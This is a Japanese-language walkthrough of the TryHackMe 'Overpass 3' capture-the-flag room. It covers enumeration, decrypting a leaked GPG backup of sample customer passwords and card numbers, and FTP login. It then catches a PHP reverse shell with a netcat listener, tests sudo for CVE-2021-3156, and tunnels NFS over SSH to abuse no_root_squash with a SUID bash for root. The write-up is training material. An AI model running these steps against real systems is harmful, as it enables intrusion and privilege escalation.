# Overpass 3 CTF

https://tryhackme.com/room/overpass3hosting

## Enumeration

```shell
TARGET=10.10.19.34
sudo bash -c "echo $TARGET   overpass.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-1-202:~# sudo nmap -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-04 01:13 BST
Nmap scan report for overpass.thm (10.10.19.34)
Host is up (0.00020s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:A0:0C:D3:A1:75 (Unknown)
```

```sh
root@ip-10-10-1-202:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-04 01:20 BST
Nmap scan report for overpass.thm (10.10.19.34)
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
MAC Address: 02:A0:0C:D3:A1:75 (Unknown)
Service Info: OS: Unix
```

FTP, SSH, HTTP

FTP は Anonymous ログイン不可。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://overpass.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backups              (Status: 301) [Size: 236] [--> http://overpass.thm/backups/]
/cgi-bin/             (Status: 403) [Size: 217]
```

/backups を発見。

### /backups

/backup に backup.zip があった。

```sh
$ unzip ./backup.zip
Archive:  ./backup.zip
 extracting: CustomerDetails.xlsx.gpg
  inflating: priv.key
```

GPG ファイルと秘密鍵。

```sh
$ gpg --import ./priv.key
gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

インポートしたら Excel ファイルになった。

```sh
$ gpg --decrypt ./CustomerDetails.xlsx.gpg > decrypted
gpg: Note: secret key 9E86A1C63FB96335 expired at Wed 09 Nov 2022 06:14:31 AM JST
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"

┌──(kali㉿kali)-[~/ctf/overpass]
└─$ file ./decrypted
./decrypted: Microsoft Excel 2007+
```

| Customer Name   | Username       | Password          | Credit card number  | CVC |
| --------------- | -------------- | ----------------- | ------------------- | --- |
| Par. A. Doxx    | paradox        | [REDACTED]        | 4111 1111 4555 1142 | 432 |
| 0day Montgomery | 0day           | OllieIsTheBestDog | 5555 3412 4444 1115 | 642 |
| Muir Land       | muirlandoracle | A11D0gsAreAw3s0me | 5103 2219 1119 9245 | 737 |

## FTP

3 ユーザーのうち、paradox でのみログインできた。

```sh
$ ftp $TARGET
Connected to 10.10.19.34.
220 (vsFTPd 3.0.3)
Name (10.10.19.34:kali): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||46088|)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
```

pentestmonkey の PHP をアップロードしたらリバースシェルを取れた。

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.19.34] 34924
Linux ip-10-10-19-34 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:38:07 up 30 min,  0 users,  load average: 0.00, 0.55, 0.90
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (886): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

```sh
bash-4.4$ env
USER=apache
PWD=/
HOME=/usr/share/httpd
LC_CTYPE=C.UTF-8
TERM=xterm
SHLVL=3
_=/usr/bin/env
bash-4.4$ ls -al /usr/share/httpd
total 24
drwxr-xr-x.  5 root root   63 Nov 17  2020 .
drwxr-xr-x. 81 root root 4096 Nov  8  2020 ..
drwxr-xr-x.  3 root root 4096 Nov  8  2020 error
drwxr-xr-x.  3 root root 8192 Nov  8  2020 icons
drwxr-xr-x.  3 root root  140 Nov  8  2020 noindex
-rw-r--r--.  1 root root   38 Nov 17  2020 web.flag
bash-4.4$ cat /usr/share/httpd/web.flag
thm{................................}
```

web フラグゲット。

## 権限昇格１

2 ユーザーいる。

```sh
bash-4.4$ ls -al /home
total 0
drwxr-xr-x.  4 root    root     34 Nov  8  2020 .
drwxr-xr-x. 17 root    root    244 Nov 18  2020 ..
drwx------.  3 james   james   112 Nov 17  2020 james
drwx------.  4 paradox paradox 203 Nov 18  2020 paradox
```

```sh
bash-4.4$ id james
uid=1000(james) gid=1000(james) groups=1000(james)
bash-4.4$ id paradox
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

paradox には、su コマンドで先ほどのパスワードで昇格できた。

```sh
[paradox@ip-10-10-19-34 ~]$ ls -al
total 56
drwx------. 4 paradox paradox   203 Nov 18  2020 .
drwxr-xr-x. 4 root    root       34 Nov  8  2020 ..
-rw-rw-r--. 1 paradox paradox 13353 Nov  8  2020 backup.zip
lrwxrwxrwx. 1 paradox paradox     9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox 10019 Nov  8  2020 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox   132 Nov  8  2020 .gnupg
-rw-------. 1 paradox paradox  3522 Nov  8  2020 priv.key
drwx------  2 paradox paradox    47 Nov 18  2020 .ssh
```

.ssh/authorized_keys に公開鍵を追記して SSH 接続を確立。

特に何もないので james を目指したい。

```sh
[paradox@ip-10-10-19-34 ~]$ find / -user james -type f -not -path "/proc/*" 2>/dev/null
/var/spool/mail/james
```

手がかりとなるファイルが無い。

```sh
[paradox@ip-10-10-19-34 ~]$ sudo --version
Sudo version 1.8.29
Sudoers policy plugin version 1.8.29
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.29
[paradox@ip-10-10-19-34 ~]$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): invalid size (unsorted)
Aborted
```

CVE-2021-3156 の脆弱性がありそう。

```sh
git clone https://github.com/CptGibbon/CVE-2021-3156.git
zip -r ./cve.zip ./CVE-2021-3156
```

wget も nc も使えないので、FTP でアップロード。  
しかし、make が無いのでいったん断念。

```sh
[paradox@ip-10-10-19-34 ~]$ cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

/home/james に、no_root_squash が付いている。

kali からマウントしたいが、ポートが開いていないので直接はできない。

```sh
$ showmount -e $TARGET
clnt_create: RPC: Unable to receive
```

NFS が 2049 ポートを使用している。

```sh
[paradox@ip-10-10-19-34 ~]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100024    1   udp  53303  status
    100005    3   udp  20048  mountd
    100024    1   tcp  48603  status
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  39447  nlockmgr
    100021    3   udp  39447  nlockmgr
    100021    4   udp  39447  nlockmgr
    100021    1   tcp  35855  nlockmgr
    100021    3   tcp  35855  nlockmgr
    100021    4   tcp  35855  nlockmgr
```

トンネリング

```sh
ssh paradox@$TARGET -i id_rsa_paradox -L 2049:localhost:2049
```

kali 上にマウントする。

```sh
$ mkdir nfs

┌──(kali㉿kali)-[~/ctf/overpass]
└─$ sudo mount -v -t nfs localhost:/ ./nfs
[sudo] password for kali:
mount.nfs: timeout set for Wed Jun  4 10:40:31 2025
mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'

┌──(kali㉿kali)-[~/ctf/overpass]
└─$ ls -al ./nfs
total 20
drwx------ 3 kali kali  112 Nov 18  2020 .
drwxrwxr-x 5 kali kali 4096 Jun  4 10:38 ..
lrwxrwxrwx 1 root root    9 Nov  9  2020 .bash_history -> /dev/null
-rw-r--r-- 1 kali kali   18 Nov  9  2019 .bash_logout
-rw-r--r-- 1 kali kali  141 Nov  9  2019 .bash_profile
-rw-r--r-- 1 kali kali  312 Nov  9  2019 .bashrc
drwx------ 2 kali kali   61 Nov  8  2020 .ssh
-rw------- 1 kali kali   38 Nov 18  2020 user.flag
```

ユーザーフラグゲット。  
SSH 秘密鍵が入っているので、セーブポイントを確保して一安心。

## 権限昇格２

まず、ターゲット上で bash をコピーする。この時点で、james オーナーとなる。

```sh
[james@ip-10-10-19-34 ~]$ cp /usr/bin/bash ./
```

kali 上で root オーナーに変更し、SUID を付ける。

```sh
$ sudo chown root ./bash
$ sudo chmod +s ./bash
```

root シェル取得成功。

```sh
[james@ip-10-10-19-34 ~]$ ./bash -p
bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) groups=1000(james)
```

## 振り返り

- Web 侵入は簡単。そのため Medium にしては簡単だったというのが全体的な印象。
- SSH トンネリングを通して NFS マウントするのが難しかった点。
- no_root_squash といえばコンパイルが必要なものだと思い込んでいたので、ターゲット上で bash コピー、kali 上で root オーナー化と SUID 付与をする手順は非常に勉強になった。
